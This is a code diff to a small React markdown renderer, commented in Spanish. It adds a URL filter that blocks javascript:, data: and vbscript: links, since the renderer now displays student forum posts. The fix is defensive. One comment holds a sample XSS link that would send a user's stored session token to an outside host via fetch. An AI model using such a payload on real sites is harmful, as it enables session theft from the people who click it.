@@ -1,11 +1,13 @@
 import type { ReactNode } from "react";
 
 /* Renderer mínimo de markdown, hecho a mano a propósito y no una lib.
+   Lo usan el contenido de las lecciones y los mensajes del foro.
 
-   Dos razones para que siga así: el contenido de una lección lo escribe
-   únicamente el docente dueño del curso (no hay markdown de terceros), y
-   nunca se inyecta HTML — cada bloque se arma con elementos de React, así que
-   no hay superficie de XSS que depender de configurar bien.
+   Por qué sigue así: nunca se inyecta HTML — cada bloque se arma con
+   elementos de React, así que no hay superficie de XSS que dependa de
+   configurar bien una lib de terceros. La única vía que sí había eran los
+   links, y la cierra `safeHref` (ver abajo): importa de verdad desde que esto
+   también pinta texto escrito por otros alumnos en el foro.
 
    Cubre headings, listas, citas, énfasis, código inline y bloques cercados.
    Lo que no hace: syntax highlighting ni tablas de GFM. Si algún día el
@@ -20,6 +22,30 @@ type Block =
   | { kind: "paragraph"; text: string };
 
 const INLINE_PATTERN = /(`[^`]+`|\*\*[^*]+\*\*|\[[^\]]+\]\([^)]+\))/g;
+
+/**
+ * Devuelve la URL sólo si es navegable y segura; `null` si no.
+ *
+ * React NO bloquea `href="javascript:..."` (desde la 16.9 avisa por consola,
+ * nada más), así que un `[click acá](javascript:fetch('https://.../'+localStorage.
+ * getItem('campus.token')))` se lleva la sesión de quien lo toque. Mientras el
+ * markdown lo escribía sólo el docente dueño del curso el riesgo era acotado;
+ * desde que esto también pinta los mensajes del FORO, donde escribe cualquier
+ * alumno, el filtro es obligatorio. Se permiten http(s), mailto y rutas
+ * internas; todo lo demás (javascript:, data:, vbscript:) se descarta.
+ */
+function safeHref(raw: string): string | null {
+  const value = raw.trim();
+  if (!value) return null;
+  // Rutas internas y anclas.
+  if (/^[/#](?!\/)/.test(value)) return value;
+  try {
+    const { protocol } = new URL(value);
+    return ["http:", "https:", "mailto:"].includes(protocol) ? value : null;
+  } catch {
+    return null;
+  }
+}
 
 function renderInline(text: string, keyPrefix: string): ReactNode[] {
   return text
@@ -49,10 +75,17 @@ function renderInline(text: string, keyPrefix: string): ReactNode[] {
 
       const link = /^\[([^\]]+)\]\(([^)]+)\)$/.exec(chunk);
       if (link) {
+        const href = safeHref(link[2]);
+        /* Sin URL válida se muestra el texto pelado, no un link roto. */
+        if (!href) {
+          return <span key={key}>{link[1]}</span>;
+        }
+        const isExternal = /^https?:/i.test(href);
         return (
           <a
             key={key}
-            href={link[2]}
+            href={href}
+            {...(isExternal ? { target: "_blank", rel: "noopener noreferrer" } : {})}
             className="text-primary hover:text-primary-hover cursor-pointer underline underline-offset-2 transition-colors duration-150"
           >
             {link[1]}
